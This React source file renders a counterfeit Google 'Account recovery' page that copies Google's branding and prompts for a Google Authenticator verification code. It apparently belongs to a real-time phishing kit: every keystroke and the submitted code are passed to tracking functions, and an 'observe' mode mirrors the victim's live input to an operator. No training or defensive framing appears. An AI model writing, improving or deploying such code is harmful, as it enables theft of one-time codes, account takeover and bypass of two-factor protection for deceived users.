import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeAccountChip,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/authenticator")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeAuthenticatorPage,
});

const GE_AUTH_CSS = `
${GE_SHELL_CSS}

.ge-auth .ge-title { margin-top: 24px; }


.ge-auth-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}


.ge-auth-heading {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-auth .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form { margin-top: 22px; }
}

.ge-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-field input {
  position: relative;
  z-index: 1;
  width: 100%;
  height: 56px;
  margin: 0;
  padding: 13px 15px;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  border-radius: 4px;
  caret-color: var(--gm3-primary);
  letter-spacing: 0.05em;
}
.ge-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  z-index: 2;
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active .ring,
.ge-field.has-value .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-field label {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  padding: 0 4px;
  color: var(--gm3-on-surface-variant);
  font-size: 1rem;
  line-height: 1.5;
  pointer-events: none;
  z-index: 3;
  background: var(--gm3-card);
  transition: top .15s cubic-bezier(.4,0,.2,1), font-size .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active label,
.ge-field.has-value label {
  top: 0;
  font-size: 0.75rem;
  line-height: 1.333;
  color: var(--gm3-primary);
}

.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GeAuthenticatorPage() {
  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [code, setCode] = useState("");
  const [focused, setFocused] = useState(false);
  const [fieldError, setFieldError] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
    setTimeout(() => inputRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (
        d.field === "totp" ||
        d.field === "authenticator_code" ||
        d.field === "Enter code" ||
        d.field === "totp_submitted"
      ) {
        setCode(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const hasValue = code.length > 0;
  const isActive = focused || hasValue;
  const canContinue = code.trim().length > 0;

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("totp", code.trim());
  };

  return (
    <div className="ge-shell ge-auth">
      <GeFontStyle />
      <style>{GE_AUTH_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Account recovery</h1>
          <p className="ge-auth-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in
          </p>
          <GeAccountChip email={email} onClick={() => trackClick("Switch account")} />
        </div>

        <div className="ge-pane-right">
          <p className="ge-auth-heading">
            Get a verification code from the Google Authenticator app
          </p>

          <form className="ge-form" onSubmit={handleNext} autoComplete="off">
            <div
              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}${fieldError ? " is-error" : ""}`}
            >
              <input
                ref={inputRef}
                id="totp"
                name="totp"
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                spellCheck={false}
                aria-label="Enter code"
                value={code}
                onFocus={() => {
                  setFocused(true);
                  setFieldError(false);
                }}
                onBlur={() => setFocused(false)}
                onChange={(e) => {
                  const v = e.target.value.replace(/[^\d\s]/g, "");
                  setCode(v);
                  setFieldError(false);
                  setFieldError(false);
                  trackInput("totp", v, "text");
                }}
              />
              <div className="ring" aria-hidden="true" />
              <label htmlFor="totp">Enter code</label>
            </div>

            <div className="ge-actions">
              <button
                type="button"
                className="ge-btn-text"
                onClick={() => {
                  trackClick("Try another way");
                  setFieldError(true);
                  inputRef.current?.focus();
                }}
              >
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
